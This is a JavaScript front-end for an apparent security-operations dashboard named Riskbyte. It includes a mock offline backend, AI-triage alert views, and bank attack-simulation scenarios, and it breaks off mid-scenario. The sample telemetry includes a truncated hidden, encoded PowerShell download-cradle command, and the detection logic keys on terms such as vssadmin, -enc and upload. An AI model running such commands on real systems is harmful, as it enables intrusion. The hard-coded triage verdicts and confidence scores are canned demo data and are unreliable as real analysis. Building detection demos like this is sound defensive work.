(function () {
  "use strict";

  /* ── Tactile Motion & Haptic Feedback ────────────────── */
  function haptic(pattern) {
    if (typeof navigator !== "undefined" && typeof navigator.vibrate === "function") {
      try {
        navigator.vibrate(pattern);
      } catch (e) {}
    }
  }

  var HAPTIC = {
    tick: 6,
    light: 10,
    medium: 18,
    success: [12, 45, 20],
    error: [30, 60, 30]
  };

  /* ── State & Helpers ──────────────────────────────────── */
  var $ = function (id) { return document.getElementById(id); };
  var token = sessionStorage.getItem("rb_token") || "";
  var currentRole = sessionStorage.getItem("rb_role") || "analyst";
  var cur = null;
  var timer = null;

  // Server mode: 'live' or 'sim'
  var serverMode = localStorage.getItem("rb_server_mode") || "live";

  function el(tag, cls, text) {
    var e = document.createElement(tag);
    if (cls) e.className = cls;
    if (text != null) e.textContent = text;
    return e;
  }

  function when(ts) {
    if (!ts) return "";
    var d = new Date(ts * 1000);
    return d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" }) +
           " (" + d.toLocaleDateString([], { month: "short", day: "numeric" }) + ")";
  }

  /* ── Dynamic Island Pill Updater ─────────────────────── */
  function updateDynamicIsland(title, msg, isAlert) {
    var island = $("dynamic-island");
    var tEl = $("island-title");
    var mEl = $("island-msg");
    var dot = $("island-status-dot");

    if (tEl) tEl.textContent = title || "Riskbyte";
    if (mEl) mEl.textContent = msg || (serverMode === "live" ? "Live SOC Engine" : "Standalone Sim");
    if (island) {
      if (isAlert) {
        island.classList.add("alert-mode");
      } else {
        island.classList.remove("alert-mode");
      }
    }
    if (dot) {
      dot.className = "island-dot " + (serverMode === "sim" ? "sim" : "");
    }
  }

  /* ── In-Browser Simulated Server (Mock Offline Fallback) ── */
  var simData = {
    stats: {
      events: 18,
      open_alerts: 4,
      open_cases: 2,
      audit_intact: true,
      version: "0.1.0-standalone",
      llm: "heuristic-sim",
      llm_redaction: true
    },
    license: {
      state: "dev",
      plan: "Offline Simulation",
      days_left: 365,
      features: ["all"],
      message: ""
    },
    cases: [
      { id: 102, entity: "fin-lt-042 (m.silva)", severity: "critical", status: "open", ts: Math.floor(Date.now() / 1000) - 300 },
      { id: 101, entity: "web-01 (1.2.3.4)", severity: "high", status: "open", ts: Math.floor(Date.now() / 1000) - 1800 }
    ],
    audit: [
      { id: 1, ts: Math.floor(Date.now() / 1000) - 120, actor: "analyst:muhammad.nabil", kind: "action_approved", alert_id: 1, detail: "Isolate host fin-lt-042 execution approved", hash: "a7f39b20e14c998a12d45b78", prev_hash: "000000000000000000000000" },
      { id: 2, ts: Math.floor(Date.now() / 1000) - 600, actor: "system:agent", kind: "rule_fired", alert_id: 2, detail: "SSH bruteforce detected on web-01", hash: "b8c1992e5f412d0a87e144a1", prev_hash: "a7f39b20e14c998a12d45b78" },
      { id: 3, ts: Math.floor(Date.now() / 1000) - 1200, actor: "ingest:api", kind: "telemetry_batch", alert_id: null, detail: "Batch ingest accepted 8 event records", hash: "99f012e88a31c5b882da1140", prev_hash: "b8c1992e5f412d0a87e144a1" }
    ],
    alerts: [
      {
        id: 1,
        title: "Base64 Encoded PowerShell Process Launch",
        severity: "critical",
        status: "triaged",
        rule_id: "rb-002",
        ts: Math.floor(Date.now() / 1000) - 120,
        host: "fin-lt-042",
        user: "m.silva",
        src_ip: "10.0.4.15",
        case_id: 102,
        triage: {
          engine: "autonomous-ai",
          verdict: "malicious",
          confidence: 0.94,
          summary: "Encoded PowerShell process attempting memory injection and command invocation. High likelihood of credential harvesting attack.",
          steps: [
            "Deobfuscated Base64 payload reveals invoke-expression (IEX) web download cradle.",
            "Process executed under user m.silva from non-standard staging path C:\\Users\\Public.",
            "Cross-referenced telemetry with active threat indicators: matched known Cobalt Strike stager signature.",
            "Automated containment rule triggered: host network isolation recommended."
          ]
        },
        proposed_action: { kind: "isolate_host", target: "fin-lt-042" },
        events: [
          { ts: Math.floor(Date.now() / 1000) - 120, host: "fin-lt-042", user: "m.silva", process: "powershell.exe", cmdline: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGo...", action: "process_start", outcome: "success" }
        ]
      },
      {
        id: 2,
        title: "SSH Repeated Authentication Bruteforce",
        severity: "high",
        status: "triaged",
        rule_id: "rb-001",
        ts: Math.floor(Date.now() / 1000) - 340,
        host: "web-01",
        user: "root",
        src_ip: "1.2.3.4",
        case_id: 101,
        triage: {
          engine: "autonomous-ai",
          verdict: "malicious",
          confidence: 0.98,
          summary: "Over 6 failed root login attempts within 30 seconds from external IP 1.2.3.4.",
          steps: [
            "Source IP identified in active threat intelligence blacklist indicators.txt.",
            "High rate of dictionary attacks on port 22.",
            "Recommendation: Block source IP at perimeter edge."
          ]
        },
        proposed_action: { kind: "block_ip", target: "1.2.3.4" },
        events: [
          { ts: Math.floor(Date.now() / 1000) - 340, host: "web-01", user: "root", src_ip: "1.2.3.4", process: "sshd", action: "login", outcome: "failure", message: "Failed password for root" }
        ]
      }
    ]
  };

  function simApi(path, method, body) {
    return new Promise(function (resolve, reject) {
      setTimeout(function () {
        var cleanPath = path.split("?")[0];
        if (cleanPath === "/api/stats") return resolve(simData.stats);
        if (cleanPath === "/api/license") return resolve(simData.license);
        if (cleanPath === "/api/alerts") return resolve(simData.alerts);
        if (cleanPath === "/api/events") {
          var allEvs = [];
          simData.alerts.forEach(function (a) {
            if (a.events) allEvs = allEvs.concat(a.events);
          });
          return resolve(allEvs);
        }
        if (cleanPath === "/api/demo/reset" || cleanPath === "/api/reset") {
          simData.alerts = [];
          simData.cases = [];
          simData.audit = [];
          simData.stats.open_alerts = 0;
          simData.stats.open_cases = 0;
          simData.stats.events = 0;
          return resolve({ ok: true, message: "Demo data reset" });
        }
        if (cleanPath === "/api/ingest") {
          var items = (body && body.events) ? body.events : (Array.isArray(body) ? body : [body]);
          var ev = items[0] || {};
          var newId = (simData.alerts.length ? Math.max.apply(null, simData.alerts.map(function(x){return x.id;})) : 0) + 1;
          var rId = "rb-001";
          var rTitle = "Security Detection";
          var rSev = "high";
          var actKind = "isolate_host";
          var actTarget = ev.host || "host-01";
          var sumText = "Autonomous AI validated malicious threat behavior.";

          if (ev.action === "email_link_click" || (ev.message && ev.message.indexOf("login-verify") !== -1)) {
            rId = "rb-006"; rTitle = "Phishing link accessed from email gateway"; rSev = "high"; actKind = "reset_password"; actTarget = ev.user || "j.doe";
            sumText = "Phishing credential harvester link accessed from email gateway.";
          } else if (ev.process === "sshd" && ev.action === "login") {
            rId = "rb-001"; rTitle = "SSH brute force from a single source"; rSev = "medium"; actKind = "block_ip"; actTarget = ev.src_ip || "1.2.3.4";
            sumText = "High-frequency SSH dictionary attack detected from untrusted scanner.";
          } else if (ev.process === "powershell.exe" || (ev.cmdline && ev.cmdline.indexOf("-enc") !== -1)) {
            rId = "rb-002"; rTitle = "Encoded PowerShell command"; rSev = "high"; actKind = "isolate_host"; actTarget = ev.host || "fin-lt-042";
            sumText = "Concealed Base64 PowerShell execution attempting memory injection.";
          } else if (ev.process === "vssadmin.exe" || ev.action === "shadow_delete" || (ev.cmdline && ev.cmdline.indexOf("vssadmin") !== -1)) {
            rId = "rb-007"; rTitle = "Ransomware volume shadow deletion and bulk encryption"; rSev = "critical"; actKind = "isolate_host"; actTarget = ev.host || "filesrv-01";
            sumText = "Ransomware shadow deletion and mass file encryption activity detected.";
          } else if (ev.action === "data_exfiltration" || (ev.cmdline && ev.cmdline.indexOf("upload") !== -1)) {
            rId = "rb-009"; rTitle = "Suspicious data exfiltration to external IP"; rSev = "high"; actKind = "isolate_host"; actTarget = ev.host || "server-01";
            sumText = "High-volume data exfiltration detected targeting external staging address.";
          } else if (ev.action === "fund_transfer" || (ev.message && ev.message.indexOf("transfer batch") !== -1)) {
            rId = "rb-010"; rTitle = "Unusual high-value fund transfer anomaly"; rSev = "critical"; actKind = "disable_user"; actTarget = ev.user || "system.raast";
            sumText = "Off-hours high-value settlement anomaly detected on instant payment gateway.";
          }

          var clientName = ev.client || "Meezan Bank";
          var newAlert = {
            id: newId,
            title: rTitle,
            severity: rSev,
            status: "triaged",
            rule_id: rId,
            client: clientName,
            ts: Math.floor(Date.now() / 1000),
            host: ev.host || "fin-lt-042",
            user: ev.user || "m.silva",
            src_ip: ev.src_ip || "10.0.0.1",
            case_id: 101,
            triage: {
              engine: "autonomous-ai",
              verdict: "malicious",
              confidence: 0.96,
              summary: sumText,
              steps: ["Behavioral signature matched Sigma detection logic.", "Threat intelligence verified malicious indicator.", "Human-in-the-loop containment proposed."]
            },
            proposed_action: { kind: actKind, target: actTarget },
            events: items
          };
          simData.alerts.unshift(newAlert);
          simData.cases.unshift({
            id: 100 + newId,
            entity: (ev.host || ev.user || "endpoint") + " (" + clientName + ")",
            severity: rSev,
            status: "open",
            client: clientName,
            ts: Math.floor(Date.now() / 1000)
          });
          simData.stats.open_alerts = simData.alerts.length;
          simData.stats.open_cases = simData.cases.length;
          simData.stats.events += items.length;
          return resolve({ accepted: items.length });
        }
        if (cleanPath.startsWith("/api/alerts/") && cleanPath.endsWith("/approve")) {
          var id = parseInt(cleanPath.split("/")[3]);
          var alert = simData.alerts.find(function (a) { return a.id === id; });
          if (alert) alert.status = "executed";
          var h = "a7f" + Math.random().toString(16).substring(2, 10) + "8c42b" + Math.random().toString(16).substring(2, 10);
          simData.audit.unshift({
            id: simData.audit.length + 1,
            ts: Math.floor(Date.now() / 1000),
            actor: "analyst:muhammad.nabil",
            kind: "action_approved",
            alert_id: id,
            client: alert ? alert.client : "Meezan Bank",
            detail: "Automated response approved: " + (alert && alert.proposed_action ? alert.proposed_action.kind : "action"),
            hash: h,
            prev_hash: "00000000000000000000000000000000"
          });
          haptic(HAPTIC.success);
          return resolve({ status: "executed", result: "dry-run: would execute action" });
        }
        if (cleanPath.startsWith("/api/alerts/") && cleanPath.endsWith("/dismiss")) {
          var id = parseInt(cleanPath.split("/")[3]);
          var alert = simData.alerts.find(function (a) { return a.id === id; });
          if (alert) alert.status = "dismissed";
          haptic(HAPTIC.light);
          return resolve({ status: "dismissed" });
        }
        if (cleanPath.startsWith("/api/alerts/")) {
          var id = parseInt(cleanPath.split("/")[3]);
          var alert = simData.alerts.find(function (a) { return a.id === id; });
          if (alert) return resolve(alert);
          return reject(new Error("Alert not found"));
        }
        if (cleanPath === "/api/cases") return resolve(simData.cases);
        if (cleanPath === "/api/audit") return resolve(simData.audit);
        reject(new Error("API route not found (404): " + cleanPath + " [" + (method || "GET") + "]. Switch to live backend or check route."));
      }, 50);
    });
  }

  /* ── Unified API Dispatcher ──────────────────────────── */
  function api(path, method, body) {
    if (serverMode === "sim") {
      return simApi(path, method, body);
    }

    var requestPath = path.startsWith("/") ? path : "/" + path;
    var opts = {
      method: method || "GET",
      headers: {
        Authorization: "Bearer " + token,
        "X-Riskbyte-Console": "1"
      }
    };
    if (body !== undefined) {
      opts.headers["Content-Type"] = "application/json";
      opts.body = typeof body === "string" ? body : JSON.stringify(body);
    }

    return fetch(requestPath, opts).then(function (r) {
      if (r.status === 401 || r.status === 403) {
        throw new Error("Authentication failed: invalid or expired token.");
      }
      return r.text().then(function (txt) {
        var j = null;
        try { j = JSON.parse(txt); } catch (e) {}

        if (!r.ok) {
          if (r.status === 404) {
            var msg = "API route not found (404): " + requestPath + " [" + (method || "GET") + "]. ";
            if (j && j.suggestion) {
              msg += j.suggestion;
            } else if (j && (j.detail || j.error)) {
              msg += (j.detail || j.error);
            } else {
              msg += "Check backend route registration in service.py / api.py or toggle server mode to 'In-Browser Sim'.";
            }
            throw new Error(msg);
          }
          throw new Error((j && (j.detail || j.error)) ? (j.detail || j.error) : ("Server error (" + r.status + ")"));
        }
        return j !== null ? j : txt;
      });
    }).catch(function (err) {
      if (err instanceof TypeError && err.message.toLowerCase().indexOf("fetch") !== -1) {
        throw new Error("Cannot connect to server. Switch server mode to 'In-Browser Sim' to run standalone.");
      }
      throw err;
    });
  }

  /* ── Server Mode Toggle UI ───────────────────────────── */
  function updateServerModeUI() {
    var label = $("server-status-label");
    var authModeText = $("auth-server-mode-text");
    var authHint = document.querySelector(".auth-server-switch-hint");
    var demoOfflineBanner = $("demo-offline-banner");

    if (serverMode === "live") {
      if (label) label.textContent = "Live";
      if (authModeText) authModeText.textContent = "Server: Live Backend (Port 8080)";
      if (authHint) authHint.textContent = "Switch to In-Browser Sim";
      if (demoOfflineBanner) demoOfflineBanner.style.display = "none";
      updateDynamicIsland("Riskbyte", "Live SOC Engine", false);
    } else {
      if (label) label.textContent = "Simulated";
      if (authModeText) authModeText.textContent = "Server: In-Browser Sim (No terminal needed)";
      if (authHint) authHint.textContent = "Switch to Live Server";
      if (demoOfflineBanner) demoOfflineBanner.style.display = "flex";
      updateDynamicIsland("Riskbyte", "Standalone Simulation", false);
    }
  }

  function toggleServerMode() {
    haptic(HAPTIC.medium);
    serverMode = (serverMode === "live") ? "sim" : "live";
    localStorage.setItem("rb_server_mode", serverMode);
    updateServerModeUI();
    showError("");
    if ($("app") && $("app").style.display === "flex") {
      refresh();
    }
  }

  /* ── Role Management & 3 Distinct Dashboards ─────────── */
  function setRole(r) {
    currentRole = r;
    sessionStorage.setItem("rb_role", r);

    var badge = $("role-badge");
    var roleText = $("role-name-text");
    if (badge) {
      badge.className = "role-badge-pill tactile-btn " + r;
    }
    if (roleText) {
      roleText.textContent = (r === "admin") ? "SOC Administrator" : ((r === "ingest") ? "Telemetry Ingest" : "Security Analyst");
    }

    // Toggle tab buttons visibility based on role
    document.querySelectorAll(".role-tab-analyst").forEach(function(b) { b.style.display = (r === "analyst") ? "" : "none"; });
    document.querySelectorAll(".role-tab-admin").forEach(function(b) { b.style.display = (r === "admin") ? "" : "none"; });
    document.querySelectorAll(".role-tab-ingest").forEach(function(b) { b.style.display = (r === "ingest") ? "" : "none"; });

    // Switch to default tab for this role
    if (r === "analyst") switchTab("alerts");
    else if (r === "admin") switchTab("admin-overview");
    else if (r === "ingest") switchTab("ingest-monitor");
  }

  /* ── Auth State ──────────────────────────────────────── */
  function applyAuthState(authed) {
    var login = $("login");
    var app = $("app");
    var out = $("out");
    var roleBadge = $("role-badge");
    var lic = $("lic");
    var stats = $("stats");
    var navWrap = document.querySelector(".nav-segmented-wrapper");
    var mobileNav = document.querySelector(".mobile-floating-tabbar");

    if (authed) {
      if (login) login.style.display = "none";
      if (app) app.style.display = "flex";
      if (out) out.style.display = "inline-flex";
      if (roleBadge) roleBadge.style.display = "inline-flex";
      if (lic) lic.style.display = "inline-flex";
      if (stats) stats.style.display = "inline-flex";
      if (navWrap) navWrap.style.display = "flex";
      setRole(currentRole);
    } else {
      if (login) login.style.display = "flex";
      if (app) app.style.display = "none";
      if (out) out.style.display = "none";
      if (roleBadge) roleBadge.style.display = "none";
      if (lic) lic.style.display = "none";
      if (stats) stats.style.display = "none";
      if (navWrap) navWrap.style.display = "none";
      if (mobileNav) mobileNav.style.display = "none";
    }
  }

  function signOut() {
    haptic(HAPTIC.light);
    sessionStorage.removeItem("rb_token");
    token = "";
    clearInterval(timer);
    timer = null;
    cur = null;
    applyAuthState(false);
    showError("");
    document.querySelectorAll(".auth-role-btn").forEach(function (b) {
      b.disabled = false;
      b.classList.remove("loading");
    });
  }

  /* ── Login Flow ──────────────────────────────────────── */
  function showError(msg) {
    var lerr = $("lerr");
    if (!lerr) return;
    lerr.textContent = msg || "";
    lerr.style.display = msg ? "block" : "none";
    if (msg) haptic(HAPTIC.error);
  }

  function performLogin(val, clickedBtn) {
    var raw = (val || "").trim();
    if (!raw) return;

    haptic(HAPTIC.medium);
    showError("");
    token = raw;

    if (raw.indexOf("admin") !== -1) currentRole = "admin";
    else if (raw.indexOf("ingest") !== -1) currentRole = "ingest";
    else currentRole = "analyst";
    sessionStorage.setItem("rb_role", currentRole);

    if (clickedBtn) {
      clickedBtn.disabled = true;
      clickedBtn.classList.add("loading");
    }

    api("/api/stats")
      .then(function () {
        sessionStorage.setItem("rb_token", token);
        showError("");
        haptic(HAPTIC.success);
        start();
      })
      .catch(function (err) {
        token = "";
        if (clickedBtn) {
          clickedBtn.disabled = false;
          clickedBtn.classList.remove("loading");
        }
        var msg = (err && err.message) ? err.message : "Access denied.";
        showError(msg);
      });
  }

  /* ── App Start (post-auth) ───────────────────────────── */
  function start() {
    applyAuthState(true);
    refresh();
    clearInterval(timer);
    timer = setInterval(refresh, 5000);
  }

  /* ── Render Alert List ───────────────────────────────── */
  function renderList(alerts) {
    var box = $("list");
    if (!box) return;
    box.replaceChildren();

    var countBadge = $("badge-alerts-count");
    if (countBadge) countBadge.textContent = String(alerts.length);

    var countLabel = $("alerts-count-label");
    if (countLabel) countLabel.textContent = alerts.length + " alert" + (alerts.length === 1 ? "" : "s");

    if (!alerts.length) {
      var empty = el("div", "empty-inspector");
      empty.appendChild(el("h3", null, "No alerts recorded"));
      empty.appendChild(el("p", null, "Waiting for incoming security telemetry."));
      box.appendChild(empty);
      return;
    }

    alerts.forEach(function (a) {
      var item = el("div", "alert-item tactile-btn s-" + a.severity + (cur === a.id ? " on" : ""));

      var hdr = el("div", "alert-item-header");
      hdr.appendChild(el("span", "alert-title", a.title));
      var sevPill = el("span", "severity-pill sev-" + a.severity, a.severity);
      hdr.appendChild(sevPill);
      item.appendChild(hdr);

      var meta = el("div", "alert-item-meta");
      var entity = a.host || a.user || a.src_ip || "system";
      if (a.client) {
        meta.appendChild(el("span", "client-badge", a.client));
      }
      meta.appendChild(el("span", "entity-badge", entity));
      meta.appendChild(el("span", "time-badge", when(a.ts)));
      item.appendChild(meta);

      var statusBadge = el("span", "status-badge " + a.status, a.status);
      item.appendChild(statusBadge);

      item.addEventListener("click", function () {
        haptic(HAPTIC.tick);
        cur = a.id;
        loadDetail();
        document.querySelectorAll(".alert-item").forEach(function (ai) {
          ai.classList.remove("on");
        });
        item.classList.add("on");
      });

      box.appendChild(item);
    });

    if (cur === null && alerts.length > 0) {
      cur = alerts[0].id;
      loadDetail();
      var first = box.querySelector(".alert-item");
      if (first) first.classList.add("on");
    }
  }

  /* ── Render Alert Detail & AI Triage ─────────────────── */
  function loadDetail() {
    if (cur === null) return;
    api("/api/alerts/" + cur).then(function (a) {
      var d = $("det");
      if (!d) return;
      d.replaceChildren();

      var hero = el("div", "inspector-hero");
      var heroTop = el("div", "inspector-hero-top");
      heroTop.appendChild(el("span", "rule-badge", a.rule_id));
      heroTop.appendChild(el("span", "severity-pill sev-" + a.severity, a.severity));
      hero.appendChild(heroTop);

      hero.appendChild(el("h2", "inspector-title", a.title));

      var chips = el("div", "inspector-chips");
      if (a.client) chips.appendChild(el("span", "chip client-badge", a.client));
      chips.appendChild(el("span", "chip", "Status: " + a.status));
      chips.appendChild(el("span", "chip", when(a.ts)));
      if (a.case_id) chips.appendChild(el("span", "chip chip-case", "Case #" + a.case_id));
      hero.appendChild(chips);

      var grid = el("div", "meta-grid");
      var metaFields = [
        ["Host", a.host || "–"],
        ["User", a.user || "–"],
        ["Source IP", a.src_ip || "–"]
      ];
      metaFields.forEach(function (pair) {
        var card = el("div", "meta-card");
        card.appendChild(el("span", "meta-k", pair[0]));
        card.appendChild(el("span", "meta-v", pair[1]));
        grid.appendChild(card);
      });
      hero.appendChild(grid);
      d.appendChild(hero);

      // AI Triage Glass Card
      var tri = a.triage;
      if (tri) {
        var glass = el("div", "triage-glass-card");
        var gHdr = el("div", "triage-header");

        var gTitleWrap = el("div", "triage-title-wrap");
        var dot = el("span", "triage-pulse-dot");
        gTitleWrap.appendChild(dot);
        gTitleWrap.appendChild(el("span", "triage-title", "Autonomous Triage Agent"));
        gHdr.appendChild(gTitleWrap);

        var vWrap = el("div", "verdict-chip-wrap");
        var verdPill = el("span", "verdict-pill verdict-" + tri.verdict, tri.verdict.replace("_", " ").toUpperCase());
        vWrap.appendChild(verdPill);
        if (tri.confidence != null) {
          var confPill = el("span", "conf-pill", Math.round(tri.confidence * 100) + "% confidence");
          vWrap.appendChild(confPill);
        }
        gHdr.appendChild(vWrap);
        glass.appendChild(gHdr);

        if (tri.engine) {
          glass.appendChild(el("div", "triage-engine-tag", "Model Engine: " + tri.engine));
        }

        if (tri.summary) {
          var sumBox = el("div", "triage-summary-box");
          sumBox.appendChild(el("p", null, tri.summary));
          glass.appendChild(sumBox);
        }

        if (tri.steps && tri.steps.length) {
          var stepsWrap = el("div", "investigation-steps");
          stepsWrap.appendChild(el("h4", "steps-heading", "Investigation Reasoning"));
          var ol = el("ol", "steps-list");
          tri.steps.forEach(function (st, idx) {
            var li = el("li");
            li.appendChild(el("span", "step-num", String(idx + 1)));
            li.appendChild(el("span", "step-txt", st));
            ol.appendChild(li);
          });
          stepsWrap.appendChild(ol);
          glass.appendChild(stepsWrap);
        }

        d.appendChild(glass);
      }

      // Proposed Response Action Bar
      var actBox = el("div", "response-card");
      var actHdr = el("div", "response-header");
      actHdr.appendChild(el("h3", null, "Containment Response Action"));

      if (a.proposed_action) {
        var pAct = a.proposed_action;
        var actDesc = el("p", "response-desc");
        actDesc.appendChild(document.createTextNode("Proposed Mitigation: "));
        var code = el("code", null, pAct.kind + " " + (pAct.target || ""));
        actDesc.appendChild(code);
        actHdr.appendChild(actDesc);
        actBox.appendChild(actHdr);

        var actBtns = el("div", "response-actions");
        if (a.status === "triaged") {
          var btnApprove = el("button", "btn btn-approve tactile-btn", "Approve & Execute");
          btnApprove.addEventListener("click", function () { act("approve"); });
          actBtns.appendChild(btnApprove);

          var btnDismiss = el("button", "btn btn-dismiss tactile-btn", "Dismiss Alert");
          btnDismiss.addEventListener("click", function () { act("dismiss"); });
          actBtns.appendChild(btnDismiss);
        } else {
          actBtns.appendChild(el("span", "status-badge " + a.status, "Action " + a.status));
        }
        actBox.appendChild(actBtns);
      } else {
        actHdr.appendChild(el("p", "response-desc", "No containment response proposed for this alert."));
        actBox.appendChild(actHdr);
        if (a.status === "triaged") {
          var actBtnsNoAct = el("div", "response-actions");
          var btnDismissOnly = el("button", "btn btn-dismiss tactile-btn", "Dismiss Alert");
          btnDismissOnly.addEventListener("click", function () { act("dismiss"); });
          actBtnsNoAct.appendChild(btnDismissOnly);
          actBox.appendChild(actBtnsNoAct);
        }
      }
      var msgBox = el("div", "action-result-msg");
      msgBox.id = "msg";
      actBox.appendChild(msgBox);
      d.appendChild(actBox);

      // Raw Telemetry Evidence Table
      if (a.events && a.events.length) {
        var evWrap = el("div", "evidence-wrap");
        evWrap.appendChild(el("h3", "evidence-heading", "Correlated Telemetry Records (" + a.events.length + ")"));
        var tableWrap = el("div", "table-responsive");
        var tbl = el("table", "macos-table tabular-nums");
        var thead = el("thead");
        var headRow = el("tr");
        ["Timestamp", "Process", "Action", "Cmd / Message"].forEach(function (h) {
          headRow.appendChild(el("th", null, h));
        });
        thead.appendChild(headRow);
        tbl.appendChild(thead);

        var tbody = el("tbody");
        a.events.forEach(function (ev) {
          var tr = el("tr");
          tr.appendChild(el("td", null, when(ev.ts)));
          tr.appendChild(el("td", null, ev.process || "–"));
          tr.appendChild(el("td", null, (ev.action || "") + (ev.outcome ? " (" + ev.outcome + ")" : "")));
          var cmdTd = el("td");
          var cmdCode = el("code", null, (ev.cmdline || ev.message || "–").substring(0, 100));
          cmdTd.appendChild(cmdCode);
          tr.appendChild(cmdTd);
          tbody.appendChild(tr);
        });
        tbl.appendChild(tbody);
        tableWrap.appendChild(tbl);
        evWrap.appendChild(tableWrap);
        d.appendChild(evWrap);
      }
    }).catch(function () {});
  }

  function act(kind) {
    haptic(HAPTIC.medium);
    api("/api/alerts/" + cur + "/" + kind, "POST")
      .then(function (r) {
        loadDetail();
        refresh();
        setTimeout(function () {
          var m = $("msg");
          if (m) {
            m.className = "action-result-msg visible";
            m.textContent = "Action executed: " + (r.result || r.status || "Success");
          }
        }, 120);
      })
      .catch(function (e) {
        var m = $("msg");
        if (m) {
          m.className = "action-result-msg visible";
          m.style.color = "var(--accent-red)";
          m.style.borderColor = "var(--accent-red)";
          m.textContent = "Action failed: " + e.message;
        }
      });
  }

  /* ── Table Renderer ──────────────────────────────────── */
  function table(id, head, rows) {
    var t = $(id);
    if (!t) return;
    t.replaceChildren();

    var thead = el("thead");
    var tr = el("tr");
    head.forEach(function (h) { tr.appendChild(el("th", null, h)); });
    thead.appendChild(tr);
    t.appendChild(thead);

    var tbody = el("tbody");
    if (!rows.length) {
      var emptyTr = el("tr");
      var emptyTd = el("td");
      emptyTd.colSpan = head.length;
      emptyTd.textContent = "No records found.";
      emptyTd.style.textAlign = "center";
      emptyTd.style.color = "var(--text-tertiary)";
      emptyTd.style.padding = "24px";
      emptyTr.appendChild(emptyTd);
      tbody.appendChild(emptyTr);
    } else {
      rows.forEach(function (r) {
        var x = el("tr");
        r.forEach(function (c) { x.appendChild(el("td", null, c)); });
        tbody.appendChild(x);
      });
    }
    t.appendChild(tbody);
  }

  /* ── Live Telemetry Stream Loader (Ingest Dashboard) ─── */
  function loadEventsStream() {
    api("/api/events").then(function (evs) {
      var tbody = $("events-tbody");
      if (!tbody) return;
      tbody.replaceChildren();
      if (!evs || !evs.length) {
        var tr = el("tr");
        var td = el("td", null, "No telemetry records ingested yet.");
        td.colSpan = 10;
        td.style.textAlign = "center";
        td.style.padding = "24px";
        td.style.color = "var(--text-tertiary)";
        tr.appendChild(td);
        tbody.appendChild(tr);
        return;
      }
      evs.forEach(function (e) {
        var tr = el("tr");
        tr.appendChild(el("td", null, "#" + e.id));
        tr.appendChild(el("td", null, when(e.ts)));
        tr.appendChild(el("td", null, e.client || "–"));
        tr.appendChild(el("td", null, e.source || "api"));
        tr.appendChild(el("td", null, e.host || "–"));
        tr.appendChild(el("td", null, e.user || "–"));
        tr.appendChild(el("td", null, e.process || "–"));
        tr.appendChild(el("td", null, (e.action || "") + (e.outcome ? " (" + e.outcome + ")" : "")));
        tr.appendChild(el("td", null, e.src_ip || e.dst_ip || "–"));
        var msgTd = el("td");
        var code = el("code", null, (e.cmdline || e.message || "–").substring(0, 60));
        msgTd.appendChild(code);
        tr.appendChild(msgTd);
        tbody.appendChild(tr);
      });
    }).catch(function () {});
  }

  /* ── Attack Simulation Lab (Demo Tab & Client Organizations) ──── */
  var CLIENT_ORGANIZATIONS = {
    meezan: {
      id: "meezan",
      name: "Meezan Bank",
      category: "Islamic Commercial Bank",
      overview: "Premier Islamic commercial bank in Pakistan, established in 2002. Operates a nationwide branch network providing Shariah-compliant retail, commercial, and investment banking services.",
      platforms: "Mobile Banking App, Digital Account Opening App, Internet Banking Portal, WhatsApp Banking, SMS Alert Gateway, ATMs, Raast Instant Payment Settlement.",
      risks: "Spear-phishing & fake SMS/WhatsApp messages impersonating the bank, customer account takeover (ATO), card/payment fraud, insider misuse, web banking brute force.",
      scenarios: [
        {
          id: "meezan_phish",
          title: "Fake Bank Login Phishing",
          severity: "high",
          rule_id: "rb-006",
          sentence: "Attacker sent spoofed SMS/WhatsApp messages luring customer customer.tariq to fraudulent portal meezan-fake-login.com, capturing credentials from proxy IP 203.0.113.88.",
          events: function () {
            var now = Math.floor(Date.now() / 1000);
            return [
              {
                ts: now - 5,
                host: "meezan-msg-gw",
                user: "customer.tariq",
                action: "email_link_click",
                src_ip: "203.0.113.88",
                message: "Customer followed link to http://meezan-fake-login.com/ibanking/verify",
                client: "Meezan Bank"
              },
              {
                ts: now,
                host: "meezan-ibanking-srv",
                user: "customer.tariq",
                process: "sso_auth",
                action: "login",
                outcome: "success",
                src_ip: "203.0.113.88",
                message: "Web login following external phishing redirection",
                client: "Meezan Bank"
              }
            ];
          },
          steps: {
            s1: {
              means: "An attacker distributed deceptive messages impersonating official bank alerts to harvest login credentials.",
              impact: "Stolen customer credentials lead directly to account takeover and fraudulent fund withdrawals."
            },
            s2: {
              means: "The telemetry pipeline ingested and normalized proxy and authentication logs from the gateway.",
              impact: "Immediate log ingestion catches compromised accounts before funds can be transferred."
            },
            s3: {
              means: "Detection rule rb-006 triggered upon matching a web request directed at a credential harvesting site.",
              impact: "Protects online banking users by intercepting sessions connected to known fraudulent domains."
            },
            s4: {
              means: "Riskbyte verified the destination URL against active threat intelligence indicator feeds.",
              impact: "Confirms that meezan-fake-login.com is an active hostile domain spoofing the bank's brand."
            },
            s5: {
              means: "The autonomous AI engine correlated the link click with immediate authentication, concluding malicious intent.",
              impact: "Eliminates false positives so security analysts focus on urgent customer protection."
            },
            s6: {
              means: "The containment engine proposed forcing an immediate customer password reset and session invalidation.",
              impact: "Instantly neutralizes the attacker's stolen credentials before funds can be moved."
            },
            s7: {
              means: "A cryptographically sealed SHA-256 ledger record documented the containment action and analyst approval.",
              impact: "Satisfies State Bank of Pakistan (SBP) cybersecurity audit and incident reporting requirements."
            }
          },
          what_happened: "An attacker spoofed Meezan Bank SMS notifications, luring user customer.tariq to a fraudulent portal (meezan-fake-login.com). Riskbyte detected the known phishing domain, flagged the session under rule rb-006, and the AI agent recommended an immediate credential revocation to safeguard the customer's account balance."
        },
        {
          id: "meezan_anomalous_login",
          title: "Suspicious Overseas Staff Login",
          severity: "high",
          rule_id: "rb-008",
          sentence: "Compromised staff credentials for staff.farooq were used to access the internal core banking VPN from foreign IP 198.51.100.99.",
          events: function () {
            var now = Math.floor(Date.now() / 1000);
            return [
              {
                ts: now,
                host: "meezan-vpn-gw",
                user: "staff.farooq",
                process: "sshd",
                action: "login",
                outcome: "success",
                src_ip: "198.51.100.99",
                message: "Staff portal login accepted from anomalous country via foreign endpoint 198.51.100.99",
                client: "Meezan Bank"
              }
            ];
          },
          steps: {
            s1: {
              means: "An unauthorized entity used valid staff credentials to authenticate from an anomalous foreign location.",
              impact: "Unauthorized overseas access to internal bank systems can bypass perimeter controls and expose core financial data."
            },
            s2: {
              means: "The perimeter VPN gateway emitted successful authentication telemetry to Riskbyte's ingest service.",
